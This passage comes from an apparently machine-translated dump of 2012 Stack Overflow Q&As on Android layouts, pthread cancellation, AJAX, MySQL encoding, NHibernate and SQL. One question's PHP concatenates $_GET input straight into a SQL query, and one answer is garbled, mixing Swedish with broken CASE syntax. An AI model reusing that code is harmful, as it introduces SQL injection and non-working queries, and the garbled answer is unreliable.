试试这个代码....对不起，但我改变了颜色，所以当你改变第一个 TextView 的文本时会产生影响

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent" android:layout_height="fill_parent"
    android:background="#ffffffff" android:weightSum="1">

    <LinearLayout android:id="@+id/item_left"
        android:layout_width="wrap_content" android:layout_height="fill_parent"
        android:paddingRight="2dp" android:paddingLeft="2dp"
        android:background="#ff0000ff" android:orientation="vertical" >
        <TextView android:id="@+id/time" android:layout_width="wrap_content"
            android:layout_height="wrap_content" android:textColor="#ff555555"
            android:text="sdfdsf s ada d a   asd sad sad"  />
    </LinearLayout>

    <LinearLayout android:layout_width="wrap_content"
        android:layout_height="match_parent" android:orientation="vertical"
        android:background="#ffff0000" 
        android:layout_weight="1" >
        <TextView android:layout_width="wrap_content"
            android:layout_height="wrap_content" android:textColor="#ff555555"
            android:text="Row1" />

        <TextView android:layout_width="wrap_content"
            android:layout_height="wrap_content" android:textColor="#ff00ff00"
            android:text="Row2" />

        <TextView android:layout_width="wrap_content"
            android:layout_height="wrap_content" android:textColor="#ff00ff00"
            android:text="Row3" />
    </LinearLayout>

</LinearLayout> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-30T05:17:52.033

```
<?xml version="1.0" encoding="utf-8"?>
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent" >

    <LinearLayout
        android:id="@+id/layout1"
        android:layout_width="wrap_content"
        android:layout_height="match_parent"
        android:orientation="vertical"
        android:background="#FF0000">

        <TextView
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:text="helloooooooooooooo" />
    </LinearLayout>

    <LinearLayout
        android:layout_width="match_parent"
        android:layout_height="match_parent"
        android:layout_toRightOf="@id/layout1"
        android:background="#0000FF"

 >

        <TextView
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:text="Row1" />

        <TextView
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:text="Row2" />

        <TextView
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:text="Row3" />
    </LinearLayout>
</RelativeLayout> 
```

# blackberry - 黑莓应用内购买使用有效信用卡退货失败原因“-224718155”

> ID：11271602
> 
> 赞同：0
> 
> 时间：2012-06-30T05:10:11.380
> 
> 标签：blackberry, in-app-purchase

当应用程序在 appworld 上处于草稿模式时，我正在尝试使用沙盒帐户使用有效的信用卡购买一些应用内商品。它正在向我发送包含失败原因为 -224718155 的 PurchaseResult 对象。为什么在我使用有效的信用卡时它会失败？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T13:26:15.030

那是用户成功购买的代码:)

[http://www.blackberry.com/developers/docs/payment/1.8api/constant-values.html](http://www.blackberry.com/developers/docs/payment/1.8api/constant-values.html)

# objective-c - 使用新 XCode 制作的应用程序无法在 iPod 2g 上运行

> ID：11271603
> 
> 赞同：1
> 
> 时间：2012-06-30T05:10:12.457
> 
> 标签：objective-c, ios, xcode

我最近升级到了最新版本的 XCode，但是使用这个新版本制作的应用程序无法在我的旧 iPod 上运行。当 iPod 为 4.2.1 时，我将目标版本设置为 4.0。当我按下运行按钮时，它会进入正常的构建过程，显示“在 iPod 上运行”，然后说“在 iPod 上运行完成”。但它没有运行，应用程序也没有添加到屏幕上。但是，如果我尝试运行在旧版本的 XCode 上制作的项目，它就可以工作。

我怎样才能解决这个问题？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-30T05:22:59.643

您需要添加`armv6`到有效架构列表中。转到您的目标设置，转到“构建设置”，搜索“有效”以找到“有效架构”，并将其更改为具有两个值，`armv6`然后`armv7`.

# java - 如何使表格单元格使用 TableLayout 中的所有屏幕高度？

> ID：11271604
> 
> 赞同：0
> 
> 时间：2012-06-30T05:10:19.187
> 
> 标签：java, android, android-layout

我是 Android 开发的新手。
我有一个活动，我想在两个表格行中设置几个按钮。但目前他们只使用了其中的一小部分
这是此活动布局的 XML：

```
<?xml version="1.0" encoding="utf-8"?>
<TableLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:id="@+id/TableLayout1"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent"
    android:orientation="vertical" >

    <TableRow
        android:id="@+id/tableRow1"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content" >

        <Button
            android:id="@+id/button1"
            android:layout_width="0dp"
            android:layout_height="wrap_content"
            android:layout_weight="1"
            android:text="Button" />

        <Button
            android:id="@+id/button2"
            android:layout_width="0dp"
            android:layout_height="wrap_content"
            android:layout_weight="1"
            android:text="Button" />

        <Button
            android:id="@+id/button3"
            android:layout_width="0dp"
            android:layout_height="wrap_content"
            android:layout_weight="1"
            android:text="Button" />
    </TableRow>

    <TableRow
        android:id="@+id/tableRow2"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content" >

    </TableRow>

    <TableRow
        android:id="@+id/tableRow3"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content" >
    </TableRow>

</TableLayout> 
```

谢谢你的帮助！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-30T05:22:49.707

尝试在表格行中使用 android:layout_weight="1"

```
 <TableRow
        android:id="@+id/tableRow1"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_weight="1"> 
```

看到这个

```
<?xml version="1.0" encoding="utf-8"?>
<TableLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:id="@+id/TableLayout1"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent"
    android:orientation="vertical" >

    <TableRow
        android:id="@+id/tableRow1"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_weight="1"
        android:background="#ffff0000">

        <Button
            android:id="@+id/button1"
            android:layout_width="0dp"
            android:layout_height="fill_parent"
            android:layout_weight="1"
            android:text="Button" />

        <Button
            android:id="@+id/button2"
            android:layout_width="0dp"
            android:layout_height="fill_parent"
            android:layout_weight="1"
            android:text="Button" />

        <Button
            android:id="@+id/button3"
            android:layout_width="0dp"
            android:layout_height="fill_parent"
            android:layout_weight="1"
            android:text="Button" />
    </TableRow>

    <TableRow
        android:id="@+id/tableRow2"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
         android:layout_weight="1"
          android:background="#ff00ff00">

    </TableRow>

    <TableRow
        android:id="@+id/tableRow3"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
         android:layout_weight="1"
          android:background="#ff00ff">
    </TableRow>

</TableLayout> 
```

![在此处输入图像描述](../Images/a3f9c7ad972b754520b40eebd14d81e8.png)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-30T05:33:05.797

就像这样....

1.  要么转到 GUI 工具以在 Eclipse 中编辑 XML 属性并设置布局属性 `layout weight to 1`。

    或转到 XML 页面，对表格行执行以下操作，`android:layout_weight="1"` `android:layout_width="wrap_content"`然后`android:layout_height="wrap_content"`

# php - PHP 和 Javascript 一起工作

> ID：11271613
> 
> 赞同：5
> 
> 时间：2012-06-30T05:11:33.600
> 
> 标签：php, javascript, real-time

这听起来可能很奇怪，但我一直在用 PHP 编写游戏。我发现的主要问题是更新 PHP 的唯一方法是加载页面。这使得实时速度变慢。Javascript 可以在不重新加载页面的情况下与页面交互。是否可以使用 Javascript 在页面上加载 PHP 页面？这样它就可以在不重新加载的情况下一遍又一遍地加载 PHP。

我已经看到它在聊天室中完成，但不确定它是如何工作的。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-30T05:17:48.073

我们主要使用 Ajax，它包含在调用服务器端页面的客户端 Javascript 代码中，而无需离开页面。

**这是一个使用GET**方法 ( [JSFiddle](http://jsfiddle.net/3MPNm/) )获取页面显示内容的示例：

```
var xhr = XMLHttpRequest ? new XMLHttpRequest() : new ActiveXObject('Microsoft.XMLHttp');
xhr.onreadystatechange = function(){
    if(xhr.readyState==4 && ((xhr.status>=200 && xhr.status<300) || xhr.status==304)){//Checks if the content was loaded
        console.log(this.responseText);
    }
}
xhr.open('GET','myPHPPage.php?foo=foo&bar=bar',true);
xhr.send(); 
```

在这里使用**POST**方法（[JSFiddle](http://jsfiddle.net/Sy4c3/)）：

```
var xhr = XMLHttpRequest ? new XMLHttpRequest() : new ActiveXObject('Microsoft.XMLHttp');
var data = 'foo=foo&bar=bar';
xhr.onreadystatechange = function(){
    if(xhr.readyState==4 && ((xhr.status>=200 && xhr.status<300) || xhr.status==304)){//Checks if the content was loaded
        console.log(this.responseText);
    }
}
xhr.open('POST','myPHPPage.php',true);
xhr.setRequestHeader('Content-type','application/x-www-form-urlencoded');
xhr.setRequestHeader('Content-length',data.length);
xhr.send(data); 
```

请注意，这里我们使用该`setRequestHeader`方法来更改此 HTTP 请求的标头，在这种情况下，更改`Content-type`和`Content-length`（此标头的默认值为 4096 字节）。此外，`setRequestHeader`方法**必须**在方法之后调用`open`。

这些链接应该可以帮助您：

[https://developer.mozilla.org/en/Ajax](https://developer.mozilla.org/en/Ajax)

[http://code.google.com/intl/pt-BR/edu/ajax/tutorials/ajax-tutorial.html](http://code.google.com/intl/pt-BR/edu/ajax/tutorials/ajax-tutorial.html)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-30T05:13:14.660

是的，这非常普遍。阅读 Ajax。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-30T05:14:31.430

我们称之为 AJAX ！！！只需阅读互联网上有关 ajax 的文档

# android - 如何获取每次下载的开始和结束时间？

> ID：11271614
> 
> 赞同：0
> 
> 时间：2012-06-30T05:11:48.013
> 
> 标签：android

我正在实现一个与下载相关的应用程序。

根据我的要求，我想获得每次下载的开始和结束时间。

例如，用户在安装我的应用程序后从 android 市场下载了一个应用程序，那么我需要获取与该下载相关的开始和结束时间。

如果有人知道解决方案，请帮助我。

提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-30T05:18:53.160

不要放直接链接下载。只需放置一个获取文件地址的php文件并让用户下载它。在这种情况下，您可以轻松地使用 php。对于完成时间，它不在您的访问范围内，但最好的方法是在页面上使用 javascript，通过 AJAX 向您发送下载报告

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-30T05:27:52.037

假设你要显示，`start download time`而`end download time`我想到的解决方案是使用一个`AsyncTask`可以在其中显示开始时间的地方，在其中`onPreExecute()`执行下载应用程序操作，`doInBackground()`下载完成时可以在`onPostExecute()`. HTH。

# c - pthread_cancel() 函数未能终止线程

> ID：11271616
> 
> 赞同：5
> 
> 时间：2012-06-30T05:11:51.273
> 
> 标签：c, multithreading, pthreads

我正在使用`pthread_create()`and`pthread_cancel()`函数来创建一个多线程程序，但我注意到它`pthread_cancel()`并没有真正终止它应该终止的线程。

```
void check(void *param){
    header_t *Bag = (header_t *) param;
    pthread_t timer_thread;
    while(true){
        if(Bag->size && TIMER_OFF){
            pthread_create(&timer_thread, NULL, (void *) &timer, (void *) Bag);
            printf("\nCREATE THREAD ID = %d\n", timer_thread);
            // ADD
        }
        else if(!TIMER_OFF && Bag->size >= 2 && Bag->next->time <= CURRENT_APT_TIME && CRRENT_TAG != Bag->next->tag){
            printf("\nOLD THREAD ID = %d TO BE CANCELLED\n", timer_thread);
            pthread_cancel(timer_thread);
            pthread_create(&timer_thread, NULL, (void *) &timer, (void *) Bag);
            printf("\nNEW THREAD ID = %d\n", timer_thread);
            // Replace
        }
        Sleep(1);
    }
} 
```

定时器功能`void timer(void *)`正是它听起来的样子，我已经包含了几行来打印出它自己的线程 ID。

测试时，看到以下内容：

```
...

OLD THREAD ID = 6041240 TO BE CANCELLED

NEW THREAD ID = 6046456

...

THREAD ID EXECUTING = 6041240 
```

所以定时器函数没有被调用终止`pthread_cancel()`？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-06-30T08:00:53.373

默认情况下，您的线程是使用[取消类型](http://linux.die.net/man/3/pthread_setcanceltype) `PTHREAD_CANCEL_DEFERRED`创建的，这意味着您需要确保您的线程具有所谓的**取消点**。即，检查取消请求并对其做出反应的点。

[此页面](http://www.kernel.org/doc/man-pages/online/pages/man7/pthreads.7.html)包含保证是取消点的功能列表。示例是一些 the`sleep()`和 pthread 函数。`pthread_testcancel()`如果您只需要一个函数来纯粹测试线程是否已被取消，您也可以使用，而不是其他。

另一种选择是`PTHREAD_CANCEL_ASYNCHRONOUS`通过使用将您的线程取消类型设置为`pthread_setcanceltype()`，这将使您的线程即使没有取消点也可以取消。但是，系统仍然可以自由选择何时实际取消线程，并且您需要非常小心以确保系统在取消时不会处于不一致的状态（通常意味着避免任何系统调用和类似 - 请参阅[异步取消安全功能](http://www.kernel.org/doc/man-pages/online/pages/man7/pthreads.7.html)列表- 很短！）。

一般来说，异步取消应该只用于或多或少的“纯”处理线程，而执行系统调用和类似的线程最好通过延迟取消和小心放置取消点来实现。

此外，只要您不[分离线程](http://www.kernel.org/doc/man-pages/online/pages/man3/pthread_detach.3.html)（通过其属性创建分离的线程，或`pthread_detach()`在创建后调用），您将需要调用`pthread_join()`计时器线程以确保在取消后清除所有资源它。否则，您最终可能会处于没有任何空闲线程资源的状态，您无法创建任何新线程。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-30T07:46:42.337

默认的取消方法`pthread_cancel()`是延迟取消。因此，当您调用时`pthread_cancel()`，它不会在指定线程到达取消点之前真正取消。您应该调用`pthread_setcanceltype`为您的线程设置另一个取消方法。

# php - UTF8 将波斯语字符串读取为 ? 在 MySQL 5.0 中

> ID：11271628
> 
> 赞同：1
> 
> 时间：2012-06-30T05:13:59.740
> 
> 标签：php, mysql, utf-8, phpmyadmin

我在 MySQL 5.0 中有一个表，我将城市名称放在波斯语中，并使用一个页面尝试读取特定的城市名称！以前是个词，突然从今天开始，我页面里的城市名全是“？？？？？？” 喜欢！我去 phpMyAdmin，将所有排序规则设置更改为“utf_persian_ci”，但没有任何反应！其中有趣的部分是 phpMyAdmin 的“浏览”选项显示一切正常（所有城市名称都可以！）但是当我尝试使用来自页面的这种查询来获取它们时，事情发生了：

```
$result = dbquery("SELECT * FROM ".DB_CITIES." WHERE cty_company_id = ".$_GET['cmp']." AND EXISTS (SELECT cu_cmp_id FROM ".DB_COMPANY_USERS." WHERE cu_cmp_id = ".$_GET['cmp']." AND cu_usr_id = $user_id) AND EXISTS (SELECT ctus_user_id FROM scada_city_users WHERE ctus_user_id = $user_id AND ctus_city_id = cty_id)"); 
```

提前致谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-30T22:17:46.597

有一种简单的方法可以告诉数据库它应该提供 UTF-8 编码的字符串。只需告诉您的连接对象，您期望哪个字符集，数据库会为您完成其余的工作。

```
$db = new mysqli($dbHost, $dbUser, $dbPw, $dbName);

// tell the db to deliver UTF-8 encoded strings.
$db->set_charset("utf8"); 
```

排序规则只定义了如何比较两个条目，它与定义字符集不同。您的 HTML 页面也应该采用 UTF-8 编码，您可以在[此处](http://www.martinstoeckli.ch/php/php.html#utf8)找到更多信息。

# android-layout - 如何根据条件更改位图图像运行时并在画布上设置？

> ID：11271630
> 
> 赞同：1
> 
> 时间：2012-06-30T05:14:14.457
> 
> 标签：android-layout

我在画布上绘制了九个矩形，并通过位图从资源中对其进行解码，从而在其上设置了图像。我正在生成 1 到 10 之间的随机数并将其设置为文本视图。当用户根据文本视图中显示的数字移动到矩形时，应更改该特定矩形的图像

```
if(textview.getText().toString()==1)
{    
    canvas.drawBitmap(bitmapHolo,null,rect[i],null);    
}
else
{       
    canvas.drawBitmap(bitmapRectangle,null,rect[i],null);    
} 
```

# c# - linq 计数中的空引用异常到休眠查询

> ID：11271633
> 
> 赞同：0
> 
> 时间：2012-06-30T05:15:28.133
> 
> 标签：c#, linq, nhibernate, lambda, linq-to-nhibernate

我有一个 NHibernate 的 linq 查询。

```
var q = SessionInstance.Query<Identity>()
       .Count(x => MyPerson != null && x.Person.Id == MyPerson.Id); 
```

但检查条件`Count`无效。因为如果值为`MyPerson`null ，count 的预期结果是，`0`但是这个查询有一个`NullReferenceException`By this 消息：

`Object reference not set to an instance of an object.`

为什么？

堆栈跟踪是：

```
 at lambda_method(Closure )
   at Remotion.Data.Linq.Parsing.ExpressionTreeVisitors.PartialEvaluatingExpressionTreeVisitor.EvaluateSubtree(Expression subtree)
   at Remotion.Data.Linq.Parsing.ExpressionTreeVisitors.PartialEvaluatingExpressionTreeVisitor.VisitExpression(Expression expression)
   at Remotion.Data.Linq.Parsing.ExpressionTreeVisitor.VisitBinaryExpression(BinaryExpression expression)
   at Remotion.Data.Linq.Parsing.ExpressionTreeVisitor.VisitExpression(Expression expression)
   at Remotion.Data.Linq.Parsing.ExpressionTreeVisitors.PartialEvaluatingExpressionTreeVisitor.VisitExpression(Expression expression)
   at Remotion.Data.Linq.Parsing.ExpressionTreeVisitor.VisitBinaryExpression(BinaryExpression expression)
   at Remotion.Data.Linq.Parsing.ExpressionTreeVisitor.VisitExpression(Expression expression)
   at Remotion.Data.Linq.Parsing.ExpressionTreeVisitors.PartialEvaluatingExpressionTreeVisitor.VisitExpression(Expression expression)
   at Remotion.Data.Linq.Parsing.ExpressionTreeVisitor.VisitLambdaExpression(LambdaExpression expression)
   at Remotion.Data.Linq.Parsing.ExpressionTreeVisitor.VisitExpression(Expression expression)
   at Remotion.Data.Linq.Parsing.ExpressionTreeVisitors.PartialEvaluatingExpressionTreeVisitor.VisitExpression(Expression expression)
   at Remotion.Data.Linq.Parsing.ExpressionTreeVisitor.VisitUnaryExpression(UnaryExpression expression)
   at Remotion.Data.Linq.Parsing.ExpressionTreeVisitor.VisitExpression(Expression expression)
   at Remotion.Data.Linq.Parsing.ExpressionTreeVisitors.PartialEvaluatingExpressionTreeVisitor.VisitExpression(Expression expression)
   at Remotion.Data.Linq.Parsing.ExpressionTreeVisitor.VisitAndConvert[T](T expression, String methodName)
   at Remotion.Data.Linq.Parsing.ExpressionTreeVisitor.<>c__DisplayClass6`1.<VisitAndConvert>b__5(T expression)
   at Remotion.Data.Linq.Parsing.ExpressionTreeVisitor.VisitList[T](ReadOnlyCollection`1 list, Func`2 visitMethod)
   at Remotion.Data.Linq.Parsing.ExpressionTreeVisitor.VisitAndConvert[T](ReadOnlyCollection`1 expressions, String callerName)
   at Remotion.Data.Linq.Parsing.ExpressionTreeVisitor.VisitMethodCallExpression(MethodCallExpression expression)
   at Remotion.Data.Linq.Parsing.ExpressionTreeVisitor.VisitExpression(Expression expression)
   at Remotion.Data.Linq.Parsing.ExpressionTreeVisitors.PartialEvaluatingExpressionTreeVisitor.VisitExpression(Expression expression)
   at Remotion.Data.Linq.Parsing.ExpressionTreeVisitors.PartialEvaluatingExpressionTreeVisitor.EvaluateIndependentSubtrees(Expression expressionTree)
   at NHibernate.Linq.NhLinqExpression..ctor(Expression expression)
   at NHibernate.Linq.NhQueryProvider.PrepareQuery(Expression expression, IQuery& query, NhLinqExpression& nhQuery)
   at NHibernate.Linq.NhQueryProvider.Execute(Expression expression)
   at NHibernate.Linq.NhQueryProvider.Execute[TResult](Expression expression)
   at System.Linq.Queryable.Count[TSource](IQueryable`1 source, Expression`1 predicate)
   at RCISP.NHibernate.Repository.IdentityRepositoryNh.IsExistOriginalIdentityForThisAlias(Identity item)
   at RCISP.Domain.Services.IdentityService.CreateIdentity(IRepositoryLocator locator, Person person)
   at RCISP.Domain.Services.IdentityService.LoadByPersonIdentificationCode(IRepositoryLocator locator, String identificationCode, Nullable`1 autoCreate)
   at RCISP.Domain.Services.EvidenceRequestService.Update[T](IRepositoryLocator locator, EvidenceRequestDto dto)
   at RCISP.Domain.Services.EvidenceRequestService.UpdateEntityCommand[T,TR](IRepositoryLocator locator, EvidenceRequestDto dto)
   at RCISP.Domain.Services.WeaponLicenseRequestService.<>c__DisplayClass4.<UpdateEntity>b__3(IRepositoryLocator locator)
   at RCISP.NHibernate.TransManager.TransManagerNh.ExecuteCommand[TResult](Func`2 command) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-30T05:23:23.967

```
if(MyPerson != null)
{
  var q = SessionInstance.Query<Identity>()
       .Count(x => x.Person != null && x.Person.Id == MyPerson.Id);
}else
{
  // if you know when MyPerson is null count is zero, why you need to Query?
  // here count is zero..

} 
```

## 编辑

```
 var q = SessionInstance.Query<Identity>()
       .Count(x => MyPerson != null && x.Person != null && x.Person.Id == MyPerson.Id); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-30T16:36:26.057

每当您在任何代码行中都有 NullReferenceException 并且不清楚它的来源时，请开始将您的长代码行拆分为更小的代码行，并进行 null 检查。

例如：

```
var q = SessionInstance.Query<Identity>();

if (q != null && MyPerson != null) {
   var count = q.Count(x => 
       x != null &&
       x.Person != null &&
       x.Person.Id == MyPerson.Id
   );
}
else {
   throw new InvalidOperationException("Something went wrong");
} 
```

# sql-server-2005 - select @var=column1 from table1 和 select top 1 column1 from table1 之间的区别

> ID：11271634
> 
> 赞同：0
> 
> 时间：2012-06-30T05:15:29.227
> 
> 标签：sql-server-2005

在 sql server 2005 中

`select @var=column1 from table1`&之间的差异`select top 1 column1 from table1`

我在这个模型的 select 语句中有一个列的视图有问题

```
select column0, fn(column0) as col from table2 
```

那个`fn`回报`select @var=column1 from table1 where table1.column3=@inputid`

我用这个替换它

```
select 
    column0, 
    (select top 1 column1 from table1 where table1.id = table2.column0) as col 
from  table2 
```

但结果与以前不同

并使用 order by in

```
select top 1 column1 from table1 where table1.id = table2.column0 
```

也没有效果

我需要知道为什么我可以改变

```
 select top 1 column1 from table1 where table1.id = table2.column0 
```

结果与

```
 select @var=column1 from table1 where table1.column3 = @inputid 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-30T05:21:52.467

当 Sql Server 编译查询时，它不会编译标量值函数。所以你永远不知道哪个结果会来自表值函数。此外，与内联查询或表值函数相比，标量值函数的性能相对较差。因为在 UNION 的情况下**ORDER BY**在 TOP 之后执行。所以我怀疑这个案例是否得到应用。可以贴一下查询的执行计划吗

查询的执行顺序

```
1\. FROM, JOIN, APPLY and ON
2\. WHERE
3\. GROUP BY
4\. HAVING
5\. SELECT
6\. ORDER BY
7\. TOP
8\. FOR XML 
```

使用 UNION 时，执行顺序略有变化

```
1\. FROM, JOIN, APPLY and ON
2\. WHERE
3\. GROUP BY
4\. HAVING
5\. TOP
5\. UNION and SELECT
6\. ORDER BY
8\. FOR XML 
```

# python - 在python中将列表输出为“矩阵”类型格式

> ID：11271639
> 
> 赞同：1
> 
> 时间：2012-06-30T05:16:36.720
> 
> 标签：python

```
my_list = ['one', 'two', 'three', 'four', 'five', 'six', 'seven'] 
```

使用 python，我需要将列表显示为：

```
one, two, three
four, five, six
seven 
```

我需要它灵活，因为列表会经常更改。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-06-30T05:20:02.890

您可以使用 itertools 中的石斑鱼[配方](http://docs.python.org/library/itertools.html#recipes)：

```
def grouper(n, iterable, fillvalue=None):
    "grouper(3, 'ABCDEFG', 'x') --> ABC DEF Gxx"
    args = [iter(iterable)] * n
    return izip_longest(fillvalue=fillvalue, *args) 
```

像这样使用：

```
for line in grouper(3, my_list):
    print ', '.join(filter(None, line)) 
```

在线查看它：[ideone](http://ideone.com/IyoZt)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-30T05:25:51.080

```
def matprint(L, numcols):
    for i,item in enumerate(L):
        print item,
        if i and not (i+1)%numcols:
            print '\n',

>>> my_list = ['one', 'two', 'three', 'four', 'five', 'six', 'seven']
>>> matprint(my_list, 3)
one two three 
four five six 
seven 
```

# php - 从指定字符开始排序

> ID：11271641
> 
> 赞同：0
> 
> 时间：2012-06-30T05:16:38.883
> 
> 标签：php, mysql

我正在从数据库中获取表单选择列表的信息。我希望表单的默认值为橙色。表单选择选项是从用户更新的数据库中获取的（“颜色”）。所以橙色是唯一以“O”开头的颜色，所以我认为必须有一种方法可以用某个字符（在本例中为 O）开始排序顺序。

这是我从数据库中获取颜色列并将行放入表单选项选择的内容。

```
$color_select = mysql_query("SELECT * FROM color");
/* Some stuff here */
echo '<select name="Color" id="color">'; 
while ($row_item = mysql_fetch_array($color_select)){ 
$pname = $row_item["color"]; 
echo "<OPTION value=\"$pname\">$pname</OPTION>"; 
} 
echo '</SELECT>'; 
/* Some stuff here */ 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-30T08:25:09.927

如果 är trevligt 按我组合 med 订购

```
ORDER BY IF(color = 'orange', 0, 1), color; 
```

Har du därimot flera specialfall är case användbar：

```
ORDER BY CASE color WHEN 'Orange' THEN 0 WHEN 'Red' 1 WHNE 'Green' THEN 2 ELSE 3 END, color; 
```

# android - 预定义文本直接发布在 facebook 墙上

> ID：11271646
> 
> 赞同：1
> 
> 时间：2012-06-30T05:17:36.647
> 
> 标签：android, facebook, post

我正在使用为 facebook im 提供的 facebook android sdk，使用他们提供的示例 - 简单，并且工作得非常好，现在登录 fb 时显示来自 fb 的表单以在按钮单击时发布到墙上。但是我想直接从代码中设置文本，然后单击按钮直接将我设置的文本发布到 fb 上，而无需调用墙贴表单来输入文本并分享。

![这是我的项目图像，包含我使用的所有 fb 相关文件](../Images/cac44f2ba8aa47c2ffe2809b9e481c0b.png)

这是我的项目图片，包含我正在使用的所有 fb 相关文件，下面是这个项目的 mu step wise o/p

1.登录

![在此处输入图像描述](../Images/896ffedf868db7974177af0ab5ad5372.png)

![在此处输入图像描述](../Images/bdf766779037509f5c2c1ffcadbfd8b7.png)

在 clcik 显示分享表格后

![在此处输入图像描述](../Images/5c31d876262c1027008acf50ff59c23a.png)

但是在墙贴之后我想直接在fb上上传我的帖子我该怎么做以及改变什么我不知道我试过但无法设置我的预定义文本，如何可以直接在墙上发布而不调用表单来分享我已经从这个链接下载了 sdk fron gitstore [https://github.com/facebook/facebook-android-sdk/](https://github.com/facebook/facebook-android-sdk/) 请帮助我提前感谢

这是我的 example.java 代码

```
 mUploadButton.setOnClickListener(new OnClickListener() {
            public void onClick(View v) {
                Bundle params = new Bundle();
                params.putString("method", "photos.upload");

                URL uploadFileUrl = null;
                try {
                    uploadFileUrl = new URL(
                        "http://www.facebook.com/images/devsite/iphone_connect_btn.jpg");
                } catch (MalformedURLException e) {
                    e.printStackTrace();
                }
                try {
                    HttpURLConnection conn= (HttpURLConnection)uploadFileUrl.openConnection();
                    conn.setDoInput(true);
                    conn.connect();
                    int length = conn.getContentLength();

                    byte[] imgData =new byte[length];
                    InputStream is = conn.getInputStream();
                    is.read(imgData);
                    params.putByteArray("picture", imgData);

                } catch  (IOException e) {
                    e.printStackTrace();
                }

                mAsyncRunner.request(null, params, "POST",
                        new SampleUploadListener(), null);
            }
        });
        mUploadButton.setVisibility(mFacebook.isSessionValid() ?
                View.VISIBLE :
                View.INVISIBLE);

        mPostButton.setOnClickListener(new OnClickListener() {
            public void onClick(View v) {
                mFacebook.dialog(Example.this, "feed",
                        new SampleDialogListener());
            }
        });
        mPostButton.setVisibility(mFacebook.isSessionValid() ?
                View.VISIBLE :
                View.INVISIBLE);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode,
                                    Intent data) {
        mFacebook.authorizeCallback(requestCode, resultCode, data);
    }

    public class SampleAuthListener implements AuthListener {

        public void onAuthSucceed() {
            mText.setText("You have logged in! ");
            mRequestButton.setVisibility(View.VISIBLE);
            mUploadButton.setVisibility(View.VISIBLE);
            mPostButton.setVisibility(View.VISIBLE);
        }

        public void onAuthFail(String error) {
            mText.setText("Login Failed: " + error);
        }
    }

    public class SampleLogoutListener implements LogoutListener {
        public void onLogoutBegin() {
            mText.setText("Logging out...");
        }

        public void onLogoutFinish() {
            mText.setText("You have logged out! ");
            mRequestButton.setVisibility(View.INVISIBLE);
            mUploadButton.setVisibility(View.INVISIBLE);
            mPostButton.setVisibility(View.INVISIBLE);
        }
    }

    public class SampleRequestListener extends BaseRequestListener {

        public void onComplete(final String response, final Object state) {
            try {
                // process the response here: executed in background thread
                Log.d("Facebook-Example", "Response: " + response.toString());
                JSONObject json = Util.parseJson(response);
                final String name = json.getString("name");

                // then post the processed result back to the UI thread
                // if we do not do this, an runtime exception will be generated
                // e.g. "CalledFromWrongThreadException: Only the original
                // thread that created a view hierarchy can touch its views."
                Example.this.runOnUiThread(new Runnable() {
                    public void run() {
                        mText.setText("Hello there, " + name + "!");
                    }
                });
            } catch (JSONException e) {
                Log.w("Facebook-Example", "JSON Error in response");
            } catch (FacebookError e) {
                Log.w("Facebook-Example", "Facebook Error: " + e.getMessage());
            }
        }
    }

    public class SampleUploadListener extends BaseRequestListener {

        public void onComplete(final String response, final Object state) {
            try {
                // process the response here: (executed in background thread)
                Log.d("Facebook-Example", "Response: " + response.toString());
                JSONObject json = Util.parseJson(response);
                final String src = json.getString("src");

                // then post the processed result back to the UI thread
                // if we do not do this, an runtime exception will be generated
                // e.g. "CalledFromWrongThreadException: Only the original
                // thread that created a view hierarchy can touch its views."
                Example.this.runOnUiThread(new Runnable() {
                    public void run() {
                        mText.setText("Hello there, photo has been uploaded at \n" + src);
                    }
                });
            } catch (JSONException e) {
                Log.w("Facebook-Example", "JSON Error in response");
            } catch (FacebookError e) {
                Log.w("Facebook-Example", "Facebook Error: " + e.getMessage());
            }
        }
    }
    public class WallPostRequestListener extends BaseRequestListener {

        public void onComplete(final String response, final Object state) {
            Log.d("Facebook-Example", "Got response: " + response);
            String message = "<empty>";
            try {

                JSONObject json = Util.parseJson(response);
                message = json.getString("lithe Technologies");
            } catch (JSONException e) {
                Log.w("Facebook-Example", "JSON Error in response");
            } catch (FacebookError e) {
                Log.w("Facebook-Example", "Facebook Error: " + e.getMessage());
            }
            final String text = "Your Wall Post: " + message + "helloooo lithe";
            Example.this.runOnUiThread(new Runnable() {
